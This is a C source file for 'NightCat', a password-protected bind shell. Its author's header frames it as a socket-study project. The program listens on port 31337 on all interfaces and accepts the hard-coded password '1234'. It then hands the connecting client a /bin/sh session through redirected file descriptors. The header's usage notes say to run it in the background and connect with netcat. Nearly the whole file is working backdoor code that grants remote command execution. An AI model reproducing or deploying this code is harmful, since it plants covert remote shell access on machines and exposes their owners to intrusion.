/*

GarageCode Genial Creations Hehehe
http://GarageCode.tk

*Function this programm
NightCat is a SSH make with Socket use Password
i make this code to study sockets,but was based
in others programms..

*tested with GCC 
 i wheel on Unix/Linux/BSD this:
 on Server 
    gcc -o program program.c; ./program& 
 in client
    nc ip_server 31337   
 if conect put 1234 in password,and put commands and enter

Author: "Cooler_"  
contact: tony.unix@yahoo.com.br
license: GPL2

visit this site: http://BotecoUnix.com.br
Real Geeks BotecoUnix

greetz 
Thanks _mlk_ , m0nad,IAK,Fox and D3lf0.
    
(       "     )    by Cooler_                                                      
  ( _  *                                                                
     * (  /              ___                                      
        "     "        _/ /       
       (   *  )    ___/__ |___                                             
         )   "     \__|00  >_/       
        *  _ )        |^_  |            
        (  )   __ _____\ _/   
         ( :  { _)         \   
    ______'___//__\   ____, \                                           
     )           ( \_/|______\                                          
   .'             \   |------'|                                        
   |               |  |       |                                
   |               |  |       |     
    \             /  /________|           
    '._/_)_(\__.'   (__,(__,_]                 
    @---()_.'---@                  

*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <signal.h>

#define PORT 31337  
#define MSG "\nNight Cat Shell \ncoded by Cooler_\n\n"
#define SHELL "/bin/sh"
#define PASSWD "1234"  

int login(int num) {
   char u_passwd[15];
   int i;
   send(num, "Password: ", 11, 0); 
   recv(num, u_passwd, sizeof(u_passwd), 0);
   for(i=0; i<strlen(u_passwd); i++) {
        if(u_passwd[i] == '\n' || u_passwd[i] == '\r')
          u_passwd[i] = '\0';
    }
   if(strcmp(PASSWD, u_passwd) == 0) return(1);  
   else return(0);  
}

int main(int argc, char *argv[]) {
  int sockfd, mostra, tamanho;
  struct sockaddr_in local;
  struct sockaddr_in remote;
   
  signal(SIGCHLD, SIG_IGN); 
  bzero(&local, sizeof(local));
  local.sin_family = AF_INET;
  local.sin_port = htons(PORT);
  local.sin_addr.s_addr = INADDR_ANY;
  bzero(&(local.sin_zero), 8);
   
   if((sockfd=socket(AF_INET, SOCK_STREAM, 0)) == -1) {
    perror("socket");
    exit(1);
   }
   if(bind(sockfd, (struct sockaddr *)&local, sizeof(struct sockaddr)) == -1) {
    perror("bind");
    exit(1);
   }
   if(listen(sockfd, 5) == -1) {
        perror("listen");
        exit(1);
   }
   tamanho = sizeof(struct sockaddr_in);
   
   for(;;) {
    if((mostra=accept(sockfd, (struct sockaddr *)&remote, &tamanho)) == -1) {
      perror("accept");
      exit(1);
    }
    if(!fork()) {
      send(mostra, MSG, sizeof(MSG), 0);       
      if(login(mostra) != 1) { 
        send(mostra, "ERROR\n", 9, 0); 
        close(mostra);
        exit(1);
      }     
      close(0); 
      close(1); 
      close(2);
      dup2(mostra, 0); 
      dup2(mostra, 1); 
      dup2(mostra, 2);  
      execl(SHELL, SHELL, (char *)0);
      close(mostra); 
      exit(0);
    }
    close(mostra);
   }
 return(0);
}




